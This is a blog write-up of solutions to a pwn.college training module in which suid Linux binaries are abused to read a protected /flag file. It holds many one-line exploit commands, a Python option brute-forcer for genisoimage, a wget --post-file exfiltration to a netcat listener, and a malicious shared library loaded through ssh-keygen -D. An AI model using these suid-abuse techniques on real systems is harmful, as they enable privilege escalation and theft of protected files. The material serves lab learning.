---
layout: post
title:  "Pwn College - Program Misuse"
date:   2024-04-26 19:59:44 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module deals with exploiting many different linux binaries, set as `suid`. \
It's pretty cool, as it teaches some non-trivial behaviors of binaries, which we usually won't take a look into. 

This page contains solutions for selected challenges. 


## Challenge 11

```bash
od -A n -x --endian=big /flag | xxd -p -r
```

## Challenge 12

```bash
hd /flag | xxd -p -r
```

## Challenge 17

```bash
gzip -c -d /flag.gz
```

## Challenge 19

```bash
zip -r /flag /flag
cat /flag.zip
```

## Challenge 23

`genisoimage ` - allows creating ISO9660 filesystem, and more. \
[genisoimage docs][genisoimage docs] 

According to docs, this binary is safe as suid. \
This is, of course, pure bs. 

I’ve wrote the following script that goes through all of the possible flags involving outer file interaction, as follow:

```python
import subprocess as sp
import mmap
import os

def check():
    try:
        with open('/home/hacker/itay_gen', 'rb', 0) as file, mmap.mmap(file.fileno(), 0, access=mmap.ACCESS_READ) as s:
            if s.find(b'pwn') != -1:
                return True
    except ValueError:
        print('Empty file')
        return False
    return False

os.dup2(1, 2)

with open('gen_flags', 'r') as f:
    data = f.readlines()
    for line in data:
        flag = line.split(' FILE')[0].strip().split()[0]
        print('Trying flag:', flag)
        cmd = '/usr/bin/genisoimage -input-charset utf-8 {} /flag -o /home/hacker/itay_gen /home/hacker/gen_test'.format(flag)
        p = sp.Popen(cmd, shell=True, stdin = sp.PIPE, stdout = sp.PIPE, close_fds = False)
        stdout, stderr = p.communicate()
        if check():
            break
```

I got many interesting results, such as segmentation fautls involving `-hppa-kernel-64`!

The interesting flag however is `-sort`, which simply gives the flag. 

## Challenge 26

```bash
make --eval=$'x:\n\t-'"cat /flag"
```

## Challenge 31

```bash
watch -x cat /flag
```

## Challenge 32

```bash
socat stdin EXEC:"cat /flag"
```

## Challenge 33

```bash
whiptail --textbox /flag 20 80
```

## Challenge 34

```bash
awk '//' /flag
```

## Challenge 36

```bash
ed
G/pwn*/
```

## Challenge 39

```bash
cp --no-preserve=mode /flag ~/flag
```

## Challenge 40

Same principle as: [windows-sticky-keys][windows-sticky-keys]. 

Move `/flag` to `/usr/bin/mv`, then execute it (can give it suid priviledges via activating the challenge once again).

## Challenge 43

[ruby-suid][ruby-suid]

## Challenge 44

Teaches a very important concept - execute `bash` with flag `-p`, for priviledges to NOT DROP!!

## Challenge 48

```bash
gcc -x c /flag
```

## Challenge 50

```bash
# Terminal 1
nc -lnvp 1337
# Terminal 2
wget --post-file=/flag 127.0.0.1:1337
```

`-i` input file doesn’t work - because URLs are given ONLY in lowercase letters, changing some letters of the flag.

## Challenge 51

This one is pretty cool. 

`ssh-keygen -D` allows loading a shared object file to the binary. \
Loaded `.so`:

```c
#include <stdio.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int C_GetFunctionList()
{
        int flag_fd = open("/flag", O_RDONLY);
        sendfile(1, flag_fd, 0, 100);
        puts("This is a shared lib!\n");
        return 0;
}

// OR:

__attribute__((constructor))
void run_first()
{
        puts("CTOR has been called!\n");
}
```

Recall `__attribute__((constructor))` runs prior to any function being called from the .so file. \
These attributes basicly adds pointer refernces to the function’s symbols within the `.ctors` and `.dtors` sections. \
The program runs `.ctors` upon .so load (which occurs during `dlopen()` at our challenge), and runs `.dtors` upon .so unload(during `dlclose()`). \
ctors and dtors are given with priorities of execution order, having values starting from `100`.

See more in [attribute-constructor][attribute-constructor]. 

`.init` and `.fini` sections are kind of old-school version of this. \
However, note that `.init` code runs before `.ctors` code! (and `.fini` runs after `.dtors`). \

We can activate them by the `-init` or `-fini` GCC flags, however they can only support a single function. 

See more in [elf-init][elf-init].

Now back to the challenge:

```bash
gcc -fpic -shared shared_lib.c -o shared_lib.so
ssh-keygen -D ./shared_lib.so
```

[genisoimage docs]: https://gtfobins.github.io/gtfobins/genisoimage/
[windows-sticky-keys]: https://scriptingis.life/2017-7-17-Sticky-Keys/
[ruby-suid]: https://www.ruby-forum.com/t/safe-0-for-setuid/186309/2
[attribute-constructor]: https://stackoverflow.com/questions/2053029/how-exactly-does-attribute-constructor-work
[elf-init]: https://www.flipcode.com/archives/Calling_A_Function_At_ELF_Shared_Library_Load_Time.shtml
